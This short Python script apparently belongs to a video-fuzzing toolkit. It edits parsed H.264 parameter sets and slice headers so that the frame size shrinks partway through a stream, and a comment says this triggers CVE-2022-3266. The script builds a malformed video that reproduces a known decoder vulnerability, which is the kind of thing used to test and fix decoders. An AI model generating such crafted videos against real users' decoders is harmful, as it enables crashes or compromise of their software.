##
# Decreasing_framesize: expects an input as [SPS, PPS, Slice, Slice, SPS, PPS, Slice, Slice]
#
# Trigger CVE-2022-3266
def decreasing_framesize(ds):

    # Set the params for the first SPS
    ds["spses"][0]["seq_parameter_set_id"] = 0
    ds["spses"][0]["pic_width_in_mbs_minus1"] = 39
    ds["spses"][0]["pic_height_in_map_units_minus1"] = 39
   
    # Set the params for the second SPS to be smaller
    ds["spses"][1]["seq_parameter_set_id"] = 1
    ds["spses"][1]["pic_width_in_mbs_minus1"] = 8
    ds["spses"][1]["pic_height_in_map_units_minus1"] = 5

    # Make the second PPS depend on second SPS
    ds["ppses"][1]["pic_parameter_set_id"] = 1
    ds["ppses"][1]["seq_parameter_set_id"] = 1

    # Ensure second PPS and SPS are used
    ds["slices"][2]["sh"]["pic_parameter_set_id"] = 1
    ds["slices"][3]["sh"]["pic_parameter_set_id"] = 1
   
    return ds

def modify_video(ds):
    return decreasing_framesize(ds)